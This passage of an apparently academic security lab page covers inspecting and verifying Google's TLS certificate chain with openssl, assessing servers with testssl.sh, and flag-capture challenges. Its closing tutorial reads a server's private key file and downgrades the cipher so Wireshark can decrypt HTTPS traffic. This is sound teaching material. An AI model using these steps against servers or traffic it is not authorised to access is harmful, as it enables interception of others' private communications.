OTAwMDA0MloXDTI4MDEyODAwMDA0MlowRzELMAkGA1UEBhMCVVMxIjAgBgNVBAoT
GUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBMTEMxFDASBgNVBAMTC0dUUyBSb290IFIx
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAthECix7joXebO9y/lD63
ladAPKH9gvl9MgaCcfb2jH/76Nu8ai6Xl6OMS/kr9rH5zoQdsfnFl97vufKj6bwS
iV6nqlKr+CMny6SxnGPb15l+8Ape62im9MZaRw1NEDPjTrETo8gYbEvs/AmQ351k
KSUjB6G00j0uYODP0gmHu81I8E3CwnqIiru6z1kZ1q+PsAewnjHxgsHA3y6mbWwZ
DrXYfiYaRQM9sHmklCitD38m5agI/pboPGiUU+6DOogrFZYJsuB6jC511pzrp1Zk
j5ZPaK49l8KEj8C8QMALXL32h7M1bKwYUH+E4EzNktMg6TO8UpmvMrUpsyUqtEj5
cuHKZPfmghCN6J3Cioj6OGaK/GP5Afl4/Xtcd/p2h/rs37EOeZVXtL0m79YB0esW
CruOC7XFxYpVq9Os6pFLKcwZpDIlTirxZUTQAs6qzkm06p98g7BAe+dDq6dso499
iYH6TKX/1Y7DzkvgtdizjkXPdsDtQCv9Uw+wp9U7DbGKogPeMa3Md+pvez7W35Ei
Eua++tgy/BBjFFFy3l3WFpO9KWgz7zpm7AeKJt8T11dleCfeXkkUAKIAf5qoIbap
sZWwpbkNFhHax2xIPEDgfg1azVY80ZcFuctL7TlLnMQ/0lUTbiSw1nH69MG6zO0b
9f6BQdgAmD06yK56mDcYBZUCAwEAAaOCATgwggE0MA4GA1UdDwEB/wQEAwIBhjAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTkrysmcRorSCeFL1JmLO/wiRNxPjAf
BgNVHSMEGDAWgBRge2YaRQ2XyolQL30EzTSo//z9SzBgBggrBgEFBQcBAQRUMFIw
JQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnBraS5nb29nL2dzcjEwKQYIKwYBBQUH
MAKGHWh0dHA6Ly9wa2kuZ29vZy9nc3IxL2dzcjEuY3J0MDIGA1UdHwQrMCkwJ6Al
oCOGIWh0dHA6Ly9jcmwucGtpLmdvb2cvZ3NyMS9nc3IxLmNybDA7BgNVHSAENDAy
MAgGBmeBDAECATAIBgZngQwBAgIwDQYLKwYBBAHWeQIFAwIwDQYLKwYBBAHWeQIF
AwMwDQYJKoZIhvcNAQELBQADggEBADSkHrEoo9C0dhemMXoh6dFSPsjbdBZBiLg9
NR3t5P+T4Vxfq7vqfM/b5A3Ri1fyJm9bvhdGaJQ3b2t6yMAYN/olUazsaL+yyEn9
WprKASOshIArAoyZl+tJaox118fessmXn1hIVw41oeQa1v1vg4Fv74zPl6/AhSrw
9U5pCZEt4Wi4wStz6dTZ/CLANx8LZh1J7QJVj2fhMtfTJr9w4z30Z209fOU0iOMy
+qduBmpvvYuR7hZL6Dupszfnw0Skfths18dG9ZKb59UhvmaSGZRVbNQpsg3BZlvi
d0lIKO2d1xozclOzgjXPYovJJIultzkMu34qQb9Sz/yilrbCgj8=
-----END CERTIFICATE-----
---
Server certificate
subject=CN = www.google.com
issuer=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: ECDSA
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 4295 bytes and written 396 bytes
Verification: OK
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 256 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
DONE
&lt;/code>&lt;/pre>&lt;p>The command is pretty verbose.
We can make it print just the certificates by using:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &amp;lt; /dev/null 2&amp;gt; /dev/null | sed -ne &amp;#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&amp;#39;
-----BEGIN CERTIFICATE-----
MIIEiTCCA3GgAwIBAgIRAJ8HSxF0Xxb8EiN1+lh5k/AwDQYJKoZIhvcNAQELBQAw
RjELMAkGA1UEBhMCVVMxIjAgBgNVBAoTGUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBM
TEMxEzARBgNVBAMTCkdUUyBDQSAxQzMwHhcNMjIwNjA2MDk0MDAwWhcNMjIwODI5
MDkzOTU5WjAZMRcwFQYDVQQDEw53d3cuZ29vZ2xlLmNvbTBZMBMGByqGSM49AgEG
CCqGSM49AwEHA0IABD8O7cXWSPQhh/GihqJi+gdtpS0vAt2GeDRHBaVeB8x5dDtx
3us2TGW2WJGfC7VeSVHCX1uDXkjAIOTauMUjCu2jggJoMIICZDAOBgNVHQ8BAf8E
BAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIwADAdBgNVHQ4E
FgQUWVwHKuk+m9ZD0/h/+Jsgactucp8wHwYDVR0jBBgwFoAUinR/r4XN7pXNPZzQ
4kYU83E1HScwagYIKwYBBQUHAQEEXjBcMCcGCCsGAQUFBzABhhtodHRwOi8vb2Nz
cC5wa2kuZ29vZy9ndHMxYzMwMQYIKwYBBQUHMAKGJWh0dHA6Ly9wa2kuZ29vZy9y
ZXBvL2NlcnRzL2d0czFjMy5kZXIwGQYDVR0RBBIwEIIOd3d3Lmdvb2dsZS5jb20w
IQYDVR0gBBowGDAIBgZngQwBAgEwDAYKKwYBBAHWeQIFAzA8BgNVHR8ENTAzMDGg
L6AthitodHRwOi8vY3Jscy5wa2kuZ29vZy9ndHMxYzMvUU92SjBOMXNUMkEuY3Js
MIIBBQYKKwYBBAHWeQIEAgSB9gSB8wDxAHYAUaOw9f0BeZxWbbg3eI8MpHrMGyfL
956IQpoN/tSLBeUAAAGBOJmjFwAABAMARzBFAiEA7Pub0IWm5kMWJrfJGLqP4lZU
71J6No/RLMwsvXWzVfACICJMzt/AFBsNQ1t970tVRnhmgsgz2s6deykihInBRfZR
AHcARqVV63X6kSAwtaKJafTzfREsQXS+/Um4havy/HD+bUcAAAGBOJmjPwAABAMA
SDBGAiEA92vym4NTX/SmjhAx7ICLE4KXpQFsWfhvRf1m5B6qby8CIQCVyyWh2t22
UhaaKSS+nIypJ9jWtOO4wG1gVkty8c/XETANBgkqhkiG9w0BAQsFAAOCAQEAI8fX
MKLNXXoMJk6WTJvV1ORE6kYVtyZm0wM64yV9V1zmksWDgOx9xHmoAUTQYeSq6rhI
tTxgb9EmDF8gVrOXwY31WpWjJyJQAfQcn3LhPUzJnr8yqyiwfVD1FG5gKQTTlblr
g9sZ+zfETFPXTFJeGT5yBxcT8xQDQNERblVkaQ1H5f2XYuXAJJ4vlNCu7AFil1tp
U4bau/EfQPx5Jd1bLxJwbeF9FbuQvcMeow+4ElcpC5BSkzsRk7lUbZfj7NWZas5t
3yp0UncNl+Pib3p0ooLDJ3HQvlQuL4AAg2nYkL+UKusZ9d/22RmbiyGkqr+3L/3+
PKvAVy9/DNPwW3YUbQ==
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFljCCA36gAwIBAgINAgO8U1lrNMcY9QFQZjANBgkqhkiG9w0BAQsFADBHMQsw
CQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZpY2VzIExMQzEU
MBIGA1UEAxMLR1RTIFJvb3QgUjEwHhcNMjAwODEzMDAwMDQyWhcNMjcwOTMwMDAw
MDQyWjBGMQswCQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZp
Y2VzIExMQzETMBEGA1UEAxMKR1RTIENBIDFDMzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAPWI3+dijB43+DdCkH9sh9D7ZYIl/ejLa6T/belaI+KZ9hzp
kgOZE3wJCor6QtZeViSqejOEH9Hpabu5dOxXTGZok3c3VVP+ORBNtzS7XyV3NzsX
lOo85Z3VvMO0Q+sup0fvsEQRY9i0QYXdQTBIkxu/t/bgRQIh4JZCF8/ZK2VWNAcm
BA2o/X3KLu/qSHw3TT8An4Pf73WELnlXXPxXbhqW//yMmqaZviXZf5YsBvcRKgKA
gOtjGDxQSYflispfGStZloEAoPtR28p3CwvJlk/vcEnHXG0g/Zm0tOLKLnf9LdwL
tmsTDIwZKxeWmLnwi/agJ7u2441Rj72ux5uxiZ0CAwEAAaOCAYAwggF8MA4GA1Ud
DwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwEgYDVR0T
AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUinR/r4XN7pXNPZzQ4kYU83E1HScwHwYD
VR0jBBgwFoAU5K8rJnEaK0gnhS9SZizv8IkTcT4waAYIKwYBBQUHAQEEXDBaMCYG
CCsGAQUFBzABhhpodHRwOi8vb2NzcC5wa2kuZ29vZy9ndHNyMTAwBggrBgEFBQcw
AoYkaHR0cDovL3BraS5nb29nL3JlcG8vY2VydHMvZ3RzcjEuZGVyMDQGA1UdHwQt
MCswKaAnoCWGI2h0dHA6Ly9jcmwucGtpLmdvb2cvZ3RzcjEvZ3RzcjEuY3JsMFcG
A1UdIARQME4wOAYKKwYBBAHWeQIFAzAqMCgGCCsGAQUFBwIBFhxodHRwczovL3Br
aS5nb29nL3JlcG9zaXRvcnkvMAgGBmeBDAECATAIBgZngQwBAgIwDQYJKoZIhvcN
AQELBQADggIBAIl9rCBcDDy+mqhXlRu0rvqrpXJxtDaV/d9AEQNMwkYUuxQkq/BQ
cSLbrcRuf8/xam/IgxvYzolfh2yHuKkMo5uhYpSTld9brmYZCwKWnvy15xBpPnrL
RklfRuFBsdeYTWU0AIAaP0+fbH9JAIFTQaSSIYKCGvGjRFsqUBITTcFTNvNCCK9U
+o53UxtkOCcXCb1YyRt8OS1b887U7ZfbFAO/CVMkH8IMBHmYJvJh8VNS/UKMG2Yr
PxWhu//2m+OBmgEGcYk1KCTd4b3rGS3hSMs9WYNRtHTGnXzGsYZbr8w0xNPM1IER
lQCh9BIiAfq0g3GvjLeMcySsN1PCAJA/Ef5c7TaUEDu9Ka7ixzpiO2xj2YC/WXGs
Yye5TBeg2vZzFb8q3o/zpWwygTMD0IZRcZk0upONXbVRWPeyk+gB9lm+cZv9TSjO
z23HFtz30dZGm6fKa+l3D/2gthsjgx0QGtkJAITgRNOidSOzNIb2ILCkXhAd4FJG
AJ2xDx8hcFH1mt0G/FX0Kw4zd8NLQsLxdxP8c4CU6x+7Nz/OAipmsHMdMqUybDKw
juDEI/9bfU1lcKwrmz3O2+BtjjKAvpafkmO8l7tdufThcV4q5O8DIrGKZTqPwJNl
1IXNDw9bg1kWRxYtnCQ6yICmJhSFm/Y3m6xv+cXDBlHz4n/FsRC6UfTd
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFYjCCBEqgAwIBAgIQd70NbNs2+RrqIQ/E8FjTDTANBgkqhkiG9w0BAQsFADBX
MQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEQMA4GA1UE
CxMHUm9vdCBDQTEbMBkGA1UEAxMSR2xvYmFsU2lnbiBSb290IENBMB4XDTIwMDYx
OTAwMDA0MloXDTI4MDEyODAwMDA0MlowRzELMAkGA1UEBhMCVVMxIjAgBgNVBAoT
GUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBMTEMxFDASBgNVBAMTC0dUUyBSb290IFIx
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAthECix7joXebO9y/lD63
ladAPKH9gvl9MgaCcfb2jH/76Nu8ai6Xl6OMS/kr9rH5zoQdsfnFl97vufKj6bwS
iV6nqlKr+CMny6SxnGPb15l+8Ape62im9MZaRw1NEDPjTrETo8gYbEvs/AmQ351k
KSUjB6G00j0uYODP0gmHu81I8E3CwnqIiru6z1kZ1q+PsAewnjHxgsHA3y6mbWwZ
DrXYfiYaRQM9sHmklCitD38m5agI/pboPGiUU+6DOogrFZYJsuB6jC511pzrp1Zk
j5ZPaK49l8KEj8C8QMALXL32h7M1bKwYUH+E4EzNktMg6TO8UpmvMrUpsyUqtEj5
cuHKZPfmghCN6J3Cioj6OGaK/GP5Afl4/Xtcd/p2h/rs37EOeZVXtL0m79YB0esW
CruOC7XFxYpVq9Os6pFLKcwZpDIlTirxZUTQAs6qzkm06p98g7BAe+dDq6dso499
iYH6TKX/1Y7DzkvgtdizjkXPdsDtQCv9Uw+wp9U7DbGKogPeMa3Md+pvez7W35Ei
Eua++tgy/BBjFFFy3l3WFpO9KWgz7zpm7AeKJt8T11dleCfeXkkUAKIAf5qoIbap
sZWwpbkNFhHax2xIPEDgfg1azVY80ZcFuctL7TlLnMQ/0lUTbiSw1nH69MG6zO0b
9f6BQdgAmD06yK56mDcYBZUCAwEAAaOCATgwggE0MA4GA1UdDwEB/wQEAwIBhjAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTkrysmcRorSCeFL1JmLO/wiRNxPjAf
BgNVHSMEGDAWgBRge2YaRQ2XyolQL30EzTSo//z9SzBgBggrBgEFBQcBAQRUMFIw
JQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnBraS5nb29nL2dzcjEwKQYIKwYBBQUH
MAKGHWh0dHA6Ly9wa2kuZ29vZy9nc3IxL2dzcjEuY3J0MDIGA1UdHwQrMCkwJ6Al
oCOGIWh0dHA6Ly9jcmwucGtpLmdvb2cvZ3NyMS9nc3IxLmNybDA7BgNVHSAENDAy
MAgGBmeBDAECATAIBgZngQwBAgIwDQYLKwYBBAHWeQIFAwIwDQYLKwYBBAHWeQIF
AwMwDQYJKoZIhvcNAQELBQADggEBADSkHrEoo9C0dhemMXoh6dFSPsjbdBZBiLg9
NR3t5P+T4Vxfq7vqfM/b5A3Ri1fyJm9bvhdGaJQ3b2t6yMAYN/olUazsaL+yyEn9
WprKASOshIArAoyZl+tJaox118fessmXn1hIVw41oeQa1v1vg4Fv74zPl6/AhSrw
9U5pCZEt4Wi4wStz6dTZ/CLANx8LZh1J7QJVj2fhMtfTJr9w4z30Z209fOU0iOMy
+qduBmpvvYuR7hZL6Dupszfnw0Skfths18dG9ZKb59UhvmaSGZRVbNQpsg3BZlvi
d0lIKO2d1xozclOzgjXPYovJJIultzkMu34qQb9Sz/yilrbCgj8=
-----END CERTIFICATE-----
&lt;/code>&lt;/pre>&lt;p>There are three certificates.
This is because the server is using a certificate chain.
A &lt;strong>certificate chain&lt;/strong> is when the CA signs and intermediate certificate which will then sign the actual certificate.
Or multiple intermediate certificates.
This is used to decentralize the certificate signing process, creating the hierarchical public key infrastructure with self signed root CAs at the top.&lt;/p>
&lt;p>We store the three certificates from Google in the &lt;code>assets/&lt;/code> folder.
We inspect the subject and issuer of each:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl x509 -noout -subject -issuer -in assets/google.crt
subject=CN = www.google.com
issuer=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
$ openssl x509 -noout -subject -issuer -in assets/google_interm2.crt
subject=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
issuer=C = US, O = Google Trust Services LLC, CN = GTS Root R1
$ openssl x509 -noout -subject -issuer -in assets/google_interm1.crt
subject=C = US, O = Google Trust Services LLC, CN = GTS Root R1
issuer=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
&lt;/code>&lt;/pre>&lt;p>The server certificate is for &lt;code>www.google.com&lt;/code> and is issued and signed by &lt;code>C = US, O = Google Trust Services LLC, CN = GTS CA 1C3&lt;/code>, who in turn is signed by &lt;code>C = US, O = Google Trust Services LLC, CN = GTS Root R1&lt;/code>, who in turn is signed by the GlobalSign Root CA.
We extracted the GlobalSign Root CA from Firefox and placed it in the &lt;code>assets/&lt;/code> folder as well:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl x509 -noout -subject -issuer -in assets/GlobalSignRootCA.crt
subject=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
issuer=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
&lt;/code>&lt;/pre>&lt;p>To verify the entire security chain we use:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat google.crt google_interm2.crt google_interm1.crt &amp;gt; google_chain.crt
$ openssl verify -CAfile google_interm2.crt google_chain.crt
google_chain.crt: OK
&lt;/code>&lt;/pre>&lt;p>The first command creates the &lt;code>google_chain.crt&lt;/code> file with the chain of certificates, the most specific certificate first.
The we use &lt;code>openssl verify&lt;/code> to successfully verify the certificate chain.&lt;/p>
&lt;h3 id="validation-and-assessment-of-remote-certificates">Validation and Assessment of Remote Certificates&lt;/h3>
&lt;p>Mostly for testing purposes, we want to know whether a given HTTPS server setup is valid and whether it is secure (i.e. it uses strong TLS parameters).
For this we can use the &lt;a href="https://www.ssllabs.com/ssltest/">SSLTest Web App&lt;/a> or the &lt;a href="https://testssl.sh/">&lt;code>testssl.sh&lt;/code> CLI tool&lt;/a>.&lt;/p>
&lt;p>&lt;strong>SSLTest&lt;/strong>&lt;/p>
&lt;p>Using &lt;a href="https://www.ssllabs.com/ssltest/">SSLTest&lt;/a> is quite easy.
Enter the URL of the target web server and then wait for the results.
Results come in a grade summary, that&amp;rsquo;s an average of several criteria, and a detailed analysis of the HTTPS security features.&lt;/p>
&lt;p>Generally, it is advised to aim for a higher score.
Note that a higher score may mean using certain security features that some browsers don&amp;rsquo;t support.
So there needs to be a trade-off between security and browser support.&lt;/p>
&lt;p>&lt;strong>testssl.sh&lt;/strong>&lt;/p>
&lt;p>Installing &lt;code>testssl.sh&lt;/code> is as simple as cloning &lt;a href="https://github.com/drwetter/testssl.sh">the repository&lt;/a> and changing to a stable branch:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ git clone https://github.com/drwetter/testssl.sh
[...]
$ cd testssl.sh/
$ git checkout -b v3.0.7 v3.0.7
&lt;/code>&lt;/pre>&lt;p>Now just pass an URL to the &lt;code>testssl.sh&lt;/code> script:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./testssl.sh security.cs.pub.ro
&lt;/code>&lt;/pre>&lt;p>If that doesn&amp;rsquo;t work, you can use Docker as detailed in &lt;a href="https://github.com/drwetter/testssl.sh">the repository&lt;/a>.&lt;/p>
&lt;p>The output is similar to the one from SSLTest.
The benefit of using &lt;code>testssl.sh&lt;/code> is it allows automation and it doesn&amp;rsquo;t require a GUI browser to do the test.&lt;/p>
&lt;h2 id="summary-of-commands">Summary of Commands&lt;/h2>
&lt;p>See below a summary of commands useful for working with HTTPS and digital certificates.&lt;/p>
&lt;p>Capture HTTP packets and print their contents (ash human-readable ASCII characters):&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo tcpdump -A tcp port 80
&lt;/code>&lt;/pre>&lt;p>Get remote web page:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ wget http://www.google.com
$ wget https://www.google.com
$ curl http://www.google.com
$ curl https://www.google.com
&lt;/code>&lt;/pre>&lt;p>Inspect certificate file:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl x509 -noout -text -in certificate.crt
$ openssl x509 -noout -subject -issuer -in certificate.crt
&lt;/code>&lt;/pre>&lt;p>Verify certificate:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl verify -CAfile CA.crt certificate.crt
&lt;/code>&lt;/pre>&lt;p>Extract certificate(s) from remote end:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &amp;lt; /dev/null 2&amp;gt; /dev/null | sed -ne &amp;#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&amp;#39;
&lt;/code>&lt;/pre>&lt;p>Assess remote HTTPS and certificate security:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./testssl.sh security.cs.pub.ro
&lt;/code>&lt;/pre>&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;h3 id="01-investigate-ssltls-enabled-websites">01. Investigate SSL/TLS-enabled Websites&lt;/h3>
&lt;p>Investigate the SSL/TLS configuration strength for different websites.
Use:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.ssllabs.com/ssltest/">SSL Server Test from SSL Labs&lt;/a> in a web browser&lt;/li>
&lt;li>&lt;a href="https://testssl.sh/">testssl.sh&lt;/a> in the command line&lt;/li>
&lt;/ul>
&lt;p>Investigate the following websites:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://curs.upb.ro/">https://curs.upb.ro/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ing.ro/">https://ing.ro/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://senat.ro/">https://senat.ro/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://republica.ro/">https://republica.ro/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.emag.ro/">https://www.emag.ro/&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Look for the following:&lt;/p>
&lt;ul>
&lt;li>the overall grade&lt;/li>
&lt;li>reasons for not getting the maximum grade&lt;/li>
&lt;li>certificate expiration date&lt;/li>
&lt;li>certification authority (CA)&lt;/li>
&lt;li>SSL/TLS version supported&lt;/li>
&lt;/ul>
&lt;p>Fill the information above in a Google spreadsheet, a copy of &lt;a href="https://docs.google.com/spreadsheets/d/1ufpcQcwSL3LEziqg5tjBK-e7B2xVq0N5xiRcq9yeRHY/edit?usp=sharing">this one&lt;/a>.&lt;/p>
&lt;h3 id="02-investigate-remote-ssltls-certificates">02. Investigate Remote SSL/TLS Certificates&lt;/h3>
&lt;p>Download, inspect and verify remote certificates.
Use &lt;code>openssl s_client&lt;/code> to download a certificate.
Use &lt;code>openssl x509&lt;/code> to investigate the downloaded certificate.
Use the Certificate Manager-like interface in you browser to extract the corresponding root certificates.
Use &lt;code>openssl verify&lt;/code> to verify a certificate;
use the extracted root certificate.&lt;/p>
&lt;p>Investigate the following websites:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://slack.com/">https://slack.com/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.pornhub.com/">https://www.pornhub.com/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.emag.ro/">https://www.emag.ro/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="03-investigate-remote-ssltls-certificates-with-sni">03. Investigate Remote SSL/TLS Certificates with SNI&lt;/h3>
&lt;p>Download, inspect and verify remote certificates.&lt;/p>
&lt;p>Investigate the following websites:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://koala.cs.pub.ro">https://koala.cs.pub.ro&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://security.cs.pub.ro">https://security.cs.pub.ro&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://wiki.cs.pub.ro">https://wiki.cs.pub.ro&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>These websites are colocated on the same IP address:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ host security.cs.pub.ro
security.cs.pub.ro has address 141.85.227.114
security.cs.pub.ro mail is handled by 5 security.cs.pub.ro.
$ host koala.cs.pub.ro
koala.cs.pub.ro has address 141.85.227.114
$ host wiki.cs.pub.ro
wiki.cs.pub.ro is an alias for koala.cs.pub.ro.
koala.cs.pub.ro has address 141.85.227.114
&lt;/code>&lt;/pre>&lt;p>So be sure to use &lt;a href="https://major.io/2012/02/07/using-openssls-s_client-command-with-web-servers-using-server-name-indication-sni/">SNI support&lt;/a> (&lt;em>Server Name Indication&lt;/em>) for the &lt;code>openssl s_client&lt;/code> command to download the correct certificate.
This means using the &lt;code>-servername&lt;/code> option.&lt;/p>
&lt;h3 id="04-inspect-me-pem">04. Inspect Me PEM&lt;/h3>
&lt;p>Get the flag from the certificate: &lt;a href="https://sss-web.cyberedu.ro/challenge/25d5c870-fc5a-11ec-bf6f-33097481169b">https://sss-web.cyberedu.ro/challenge/25d5c870-fc5a-11ec-bf6f-33097481169b&lt;/a>&lt;/p>
&lt;h3 id="05-inspect-me-der">05. Inspect Me DER&lt;/h3>
&lt;p>Get the flag from the certificate: &lt;a href="https://sss-web.cyberedu.ro/challenge/82120dc0-fc5a-11ec-8907-a767cfc56b45">https://sss-web.cyberedu.ro/challenge/82120dc0-fc5a-11ec-8907-a767cfc56b45&lt;/a>&lt;/p>
&lt;h3 id="06-the-chosen-one">06. The Chosen One&lt;/h3>
&lt;p>Find the correct certificate and get the flag from it: &lt;a href="https://sss-web.cyberedu.ro/challenge/38b30e80-fc68-11ec-9c1f-6177b11a278c">https://sss-web.cyberedu.ro/challenge/38b30e80-fc68-11ec-9c1f-6177b11a278c&lt;/a>&lt;/p>
&lt;h3 id="07-proper-naming">07. Proper Naming&lt;/h3>
&lt;p>Get the flag from http://141.85.224.117:3280
Submit the flag to: &lt;a href="https://sss-web.cyberedu.ro/challenge/32215080-fc7b-11ec-940b-ad7b1c8e700c">https://sss-web.cyberedu.ro/challenge/32215080-fc7b-11ec-940b-ad7b1c8e700c&lt;/a>&lt;/p>
&lt;h3 id="08-inside">08. Inside&lt;/h3>
&lt;p>Get the flag from http://141.85.224.117:3380
Submit the flag to: &lt;a href="https://sss-web.cyberedu.ro/challenge/298a4d30-fc85-11ec-9624-c3b4658b387a">https://sss-web.cyberedu.ro/challenge/298a4d30-fc85-11ec-9624-c3b4658b387a&lt;/a>&lt;/p>
&lt;h3 id="09-only-for-members">09. Only for Members&lt;/h3>
&lt;p>Connect via HTTPS to a https://141.85.224.117:31443.
Use client certificate authentication to retrieve the flag.&lt;/p>
&lt;p>The client certificate needs to be signed by the same certification authority as that of the server.
See the files and scripts in the &lt;code>securing-communication/assets/ca/&lt;/code> folder in the repository.&lt;/p>
&lt;p>Submit flag to: &lt;a href="https://sss-web.cyberedu.ro/challenge/c8d977d0-fc9c-11ec-80d9-0de38261593f">https://sss-web.cyberedu.ro/challenge/c8d977d0-fc9c-11ec-80d9-0de38261593f&lt;/a>&lt;/p>
&lt;h3 id="extra-tutorial-inspect-https-traffic">Extra: Tutorial: Inspect HTTPS Traffic&lt;/h3>
&lt;p>In this tutorial challenge, we capture and aim to decrypt HTTPS traffic.
We use Wireshark to capture traffic.&lt;/p>
&lt;p>To decrypt traffic, we need to have access to the private key of the server.
Copy the contents of the private key from the Nginx server set up above, from the &lt;code>/etc/letsencrypt/live/&amp;lt;hostname&amp;gt;/privkey.pem&lt;/code> into a local file.&lt;/p>
&lt;p>Start Wireshark (as &lt;code>root&lt;/code>).
Load the private key in Wireshark using instructions &lt;a href="https://accedian.com/blog/how-to-decrypt-an-https-exchange-with-wireshark/">here&lt;/a>.&lt;/p>
&lt;p>Start packet capture in Wireshark and filter packets to / from the IP address of the server.
Use a string such as &lt;code>ip.addr = &amp;lt;server_IP_address&amp;gt;&lt;/code> in the filter line in Wireshark.&lt;/p>
&lt;p>Use &lt;code>curl&lt;/code> to request the index page from the server:&lt;/p>
&lt;pre tabindex="0">&lt;code>curl https://&amp;lt;hostname&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Packet capture in Wireshark will not show decrypted content, similar to the image below.&lt;/p>
&lt;p>&lt;img src="https-capture-decrypt/wireshark-no-decrypt.png" alt="HTTPS not decrypted">&lt;/p>
&lt;p>This is because, by default, the connection uses SSL / TLS ciphers with &lt;a href="https://en.wikipedia.org/wiki/Forward_secrecy">PFS&lt;/a> (&lt;em>Perfect Forward Secrecy&lt;/em>) usually enabled with DHE (&lt;em>Diffie-Hellman Exchange&lt;/em>).
Don&amp;rsquo;t bother with the acronyms and their significance, we use them to let you know the terms and maybe look for additional information later on.&lt;/p>
&lt;p>However, we can request &lt;code>curl&lt;/code> to not use PFS, by choosing a simpler cipher.
This simple cipher will use the private key that we are in possession of (and that we loaded into Wireshark) to encrypt traffic.
This is also explained &lt;a href="https://accedian.com/blog/how-to-decrypt-an-https-exchange-with-wireshark/">here&lt;/a>.&lt;/p>
&lt;p>Use &lt;code>curl&lt;/code> to request the index page from the server with a simpler cipher that does not use DHE:&lt;/p>
&lt;pre tabindex="0">&lt;code>curl --ciphers AES256-SHA https://&amp;lt;hostname&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Now, the packet capture shows actual decrypted HTTP content, similar to the image below.&lt;/p>
&lt;p>&lt;img src="https-capture-decrypt/wireshark-decrypt.png" alt="HTTPS decrypted">&lt;/p>
&lt;p>You can use &lt;code>Right click&lt;/code> -&amp;gt; &lt;code>Follow&lt;/code> -&amp;gt; &lt;code>HTTP stream&lt;/code> to extract the HTTP traffic only.&lt;/p>
&lt;p>In summary, with access to the private key, if the cipher used in the HTTPS connection (HTTP + SSL / TLS) doesn&amp;rsquo;t use DHE, we can decrypt the traffic.
Of course, this requires access to the private key.
In an actual attack this is another part of the attack vector where some server-side vulnerability allows the extraction of the private key.&lt;/p>
&lt;h2 id="resources-and-tools">Resources and Tools&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.tcpdump.org/">tcpdump&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.wireshark.org/">Wireshark&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.openssl.org/">openssl&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs">OpenSSL Essentials&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.sslshopper.com/article-most-common-openssl-commands.html">The Most Common OpenSSL Commands&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://geekflare.com/openssl-commands-certificates/">OpenSSL Examples&lt;/a>&lt;/li>
